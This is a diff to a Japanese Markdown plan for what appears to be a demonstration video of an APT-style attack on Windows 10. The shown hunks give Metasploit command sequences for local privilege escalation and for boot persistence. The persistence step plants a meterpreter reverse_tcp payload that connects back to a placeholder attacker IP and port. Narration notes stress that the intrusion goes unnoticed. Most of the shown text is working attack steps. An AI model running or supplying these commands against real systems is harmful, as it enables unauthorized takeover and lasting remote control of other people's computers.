@@ -107,11 +107,12 @@ classDiagram
 - **目的**: 一般ユーザーから管理者権限を取得
 - **ツール**: Metasploit
 - **手順**:
-  ```
+    ```bash
 background
 use post/multi/recon/local_exploit_suggester
 set SESSION <セッションID>
-run```
+run
+    ```
 - **動画用の工夫**:
   - 権限昇格前後の`whoami`出力を比較表示
   - 「管理者権限でシステムを完全制御」とナレーション
@@ -124,12 +125,17 @@ run```
 - **手順**:
   1. 永続化モジュールを使用：
      ```bash
-     usemodule persistence/osx/schtasks
-     set Agent [Agent_Name]
-     execute
+background
+use exploit/windows/local/persistence
+set SESSION <セッションID>
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <攻撃者IP>
+set LPORT <ポート>
+set STARTUP SYSTEM
+set DELAY 60
+exploit
      ```
-     - Windowsのスケジュールタスクでペイロードを定期実行
-  2. Windows 10を再起動し、Empireで接続を確認
+  2. Windows 10を再起動し、接続を確認
 - **動画用の工夫**:
   - 再起動後の接続成功をカウントダウンで演出
   - 「APTは長期間潜伏し、気づかれません」と解説
